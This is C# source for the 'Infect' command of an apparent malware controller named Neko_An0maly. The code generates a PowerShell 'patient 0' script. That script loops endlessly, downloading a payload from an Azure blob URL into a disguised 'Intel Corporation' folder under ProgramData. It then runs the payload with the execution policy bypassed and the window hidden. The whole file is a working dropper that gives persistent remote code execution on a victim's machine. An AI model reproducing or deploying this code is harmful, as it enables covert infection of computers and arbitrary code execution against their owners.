using System;
using System.IO;
using System.Text;
using Microsoft.WindowsAzure.Storage;
using Microsoft.WindowsAzure.Storage.Blob;
using System.Threading;
using System.Threading.Tasks;

namespace Neko_An0maly.Commands
{
    public class Infect : Command
    {
        public static string path = Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + @"\";
        public Infect(string name) : base(name) { }

        public override string execute(string[] args)
        {
            if (args.Length == 1)
            {
                if (File.Exists(path + "main.ps1"))
                {
                    File.Delete(path + "main.ps1");
                }

                Console.WriteLine("Initializing command to be sent.");

                string fileName = "main.ps1";
                string finalPath = path + fileName;
                using (FileStream fs = File.Create(finalPath))
                {
                    Byte[] line1 = new UTF8Encoding(true).GetBytes("while($true)\n");
                    fs.Write(line1, 0, line1.Length);
                    byte[] line2 = new UTF8Encoding(true).GetBytes("{");
                    fs.Write(line2, 0, line2.Length);
                    byte[] line3 = new UTF8Encoding(true).GetBytes("\n" + @"    try {");
                    fs.Write(line3, 0, line3.Length);
                    byte[] line4 = new UTF8Encoding(true).GetBytes("\n" + @"        Remove-Item " + (char)34 + @"C:\ProgramData\Intel Corporation\" + args[0] + ".ps1" + (char)34);
                    fs.Write(line4, 0, line4.Length);
                    byte[] line5 = new UTF8Encoding(true).GetBytes("\n" + @"    }catch {}");
                    fs.Write(line5, 0, line5.Length);
                    byte[] line6 = new UTF8Encoding(true).GetBytes("\n" + @"    try {");
                    fs.Write(line6, 0, line6.Length);
                    byte[] line7 = new UTF8Encoding(true).GetBytes("\n" + @"        Invoke-WebRequest " + (char)34 + @"https://previewps.blob.core.windows.net/ftp/" + args[0] + ".ps1" + (char)34 + " -OutFile " + (char)34 + @"C:\ProgramData\Intel Corporation\" + args[0] + ".ps1" + (char)34);
                    fs.Write(line7, 0, line7.Length);
                    byte[] line8 = new UTF8Encoding(true).GetBytes("\n" + @"    }catch {}");
                    fs.Write(line8, 0, line8.Length);
                    byte[] line9 = new UTF8Encoding(true).GetBytes("\n" + @"    try {");
                    fs.Write(line9, 0, line9.Length);
                    byte[] line10 = new UTF8Encoding(true).GetBytes("\n" + @"        powershell.exe -ExecutionPolicy Bypass -windowstyle hidden -File " + (char)34 + @"C:\ProgramData\Intel Corporation\" + args[0] + ".ps1" + (char)34);
                    fs.Write(line10, 0, line10.Length);
                    byte[] line11 = new UTF8Encoding(true).GetBytes("\n" + @"    }catch {}");
                    fs.Write(line11, 0, line11.Length);
                    byte[] line12 = new UTF8Encoding(true).GetBytes("\n" + @"    Start-Sleep -Seconds 5");
                    fs.Write(line12, 0, line12.Length);
                    byte[] line13 = new UTF8Encoding(true).GetBytes("\n" + @"}");
                    fs.Write(line13, 0, line13.Length);
                }

                Console.ForegroundColor = ConsoleColor.Red;  
                Console.WriteLine("GENERATED PATIENT 0 FILE WITH TARGET: " + args[0]);
                Console.ForegroundColor = ConsoleColor.White;
                Console.WriteLine("");

                return "";
            }
            else
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("Invalid arguments for 'infect'. Requires 1 argument(s).");
                Console.ForegroundColor = ConsoleColor.White;
                return "";
            }
        }
    }
}
